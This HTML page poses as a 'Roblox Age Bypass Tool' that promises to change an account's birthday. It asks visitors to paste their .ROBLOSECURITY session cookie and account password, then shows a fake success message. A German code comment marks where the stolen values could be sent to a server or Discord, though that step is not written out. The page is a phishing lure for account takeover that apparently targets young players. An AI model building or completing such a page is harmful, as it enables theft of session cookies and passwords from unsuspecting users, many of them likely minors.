<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Roblox Age Bypass Tool</title>
  <style>
    /* Styles wie gehabt, hier der Kürze halber nur minimal */
    body {
      font-family: 'Inter', sans-serif;
      background: linear-gradient(to bottom, #0c0f1f, #090d1a);
      color: #fff;
      padding: 40px;
      text-align: center;
    }
    select, textarea, button {
      margin-top: 10px;
      width: 300px;
      padding: 10px;
      border-radius: 6px;
      border: none;
      font-size: 16px;
    }
    #password-block, #cookie-block, #birthday-section, #process-button {
      margin-top: 20px;
      display: none;
    }
    #success-message, #error-message {
      margin-top: 20px;
      padding: 10px;
      border-radius: 6px;
      width: 300px;
      display: none;
    }
    #success-message {
      background-color: #4caf50;
    }
    #error-message {
      background-color: #f44336;
    }
  </style>
</head>
<body>

<h1>ROBLOX AGE BYPASS TOOL</h1>

<select id="bypass" aria-label="Account Security Options">
  <option value="">-- Select an option --</option>
  <option value="birthyear">2008 Birthyear Up</option>
  <option value="13plus">13+ All Ages</option>
</select>

<div id="cookie-block">
  <label>.ROBLOSECURITY Cookie</label><br />
  <textarea id="cookie-input" placeholder="Paste your .ROBLOSECURITY Cookie here..." spellcheck="false" autocomplete="off" autocorrect="off" autocapitalize="off"></textarea>
</div>

<div id="password-block">
  <label>Account Password</label><br />
  <textarea id="password-input" placeholder="Enter account password for verification..." spellcheck="false" autocomplete="off" autocorrect="off" autocapitalize="off"></textarea>
</div>

<div id="birthday-section">
  <label>Set your Birthday</label><br />
  <select id="birthday-day" aria-label="Day"></select>
  <select id="birthday-month" aria-label="Month">
    <option value="">Month</option>
    <option value="1">January</option>
    <option value="2">February</option>
    <option value="3">March</option>
    <option value="4">April</option>
    <option value="5">May</option>
    <option value="6">June</option>
    <option value="7">July</option>
    <option value="8">August</option>
    <option value="9">September</option>
    <option value="10">October</option>
    <option value="11">November</option>
    <option value="12">December</option>
  </select>
  <select id="birthday-year" aria-label="Year"></select>
</div>

<button id="process-button">⚙️ PROCESS ACCOUNT</button>

<div id="success-message">Everything worked it can take 2-6 Hours until the age will be set</div>
<div id="error-message">ERROR Try later again.</div>

<script>
  const bypassSelect = document.getElementById('bypass');
  const cookieBlock = document.getElementById('cookie-block');
  const passwordBlock = document.getElementById('password-block');
  const birthdaySection = document.getElementById('birthday-section');
  const processButton = document.getElementById('process-button');
  const successMessage = document.getElementById('success-message');
  const errorMessage = document.getElementById('error-message');

  const birthdayDay = document.getElementById('birthday-day');
  const birthdayYear = document.getElementById('birthday-year');

  // Optionen Tag füllen
  function fillDays() {
    birthdayDay.innerHTML = '<option value="">Day</option>';
    for(let i=1; i<=31; i++) {
      const opt = document.createElement('option');
      opt.value = i;
      opt.textContent = i;
      birthdayDay.appendChild(opt);
    }
  }
  // Optionen Jahr füllen
  function fillYears() {
    birthdayYear.innerHTML = '<option value="">Year</option>';
    const currentYear = new Date().getFullYear();
    for(let y = currentYear; y >= 1900; y--) {
      const opt = document.createElement('option');
      opt.value = y;
      opt.textContent = y;
      birthdayYear.appendChild(opt);
    }
  }

  fillDays();
  fillYears();

  bypassSelect.addEventListener('change', () => {
    successMessage.style.display = 'none';
    errorMessage.style.display = 'none';

    cookieBlock.style.display = 'none';
    passwordBlock.style.display = 'none';
    birthdaySection.style.display = 'none';
    processButton.style.display = 'none';

    // Falls nichts ausgewählt
    if (!bypassSelect.value) return;

    cookieBlock.style.display = 'block';
    birthdaySection.style.display = 'block';
    processButton.style.display = 'block';

    if (bypassSelect.value === '13plus') {
      passwordBlock.style.display = 'block';
    }
  });

  processButton.addEventListener('click', () => {
    successMessage.style.display = 'none';
    errorMessage.style.display = 'none';

    if (!cookieBlock.style.display || cookieBlock.style.display === 'none') {
      errorMessage.textContent = 'Please select an option first.';
      errorMessage.style.display = 'block';
      return;
    }

    const cookieVal = document.getElementById('cookie-input').value.trim();
    if (!cookieVal) {
      errorMessage.textContent = 'Please enter your .ROBLOSECURITY cookie.';
      errorMessage.style.display = 'block';
      return;
    }

    if (bypassSelect.value === '13plus') {
      const passwordVal = document.getElementById('password-input').value.trim();
      if (!passwordVal) {
        errorMessage.textContent = 'Please enter your password.';
        errorMessage.style.display = 'block';
        return;
      }
    }

    const day = birthdayDay.value;
    const month = document.getElementById('birthday-month').value;
    const year = birthdayYear.value;

    if (!day || !month || !year) {
      errorMessage.textContent = 'Please select your full birthday.';
      errorMessage.style.display = 'block';
      return;
    }

    // Hier könnte die Anfrage an Server/Discord o.ä. erfolgen
    // Demo: Erfolgsmeldung zeigen

    successMessage.textContent = 'Everything worked. It can take 2-6 hours until the birthday is set.';
    successMessage.style.display = 'block';
  });
</script>

</body>
</html>
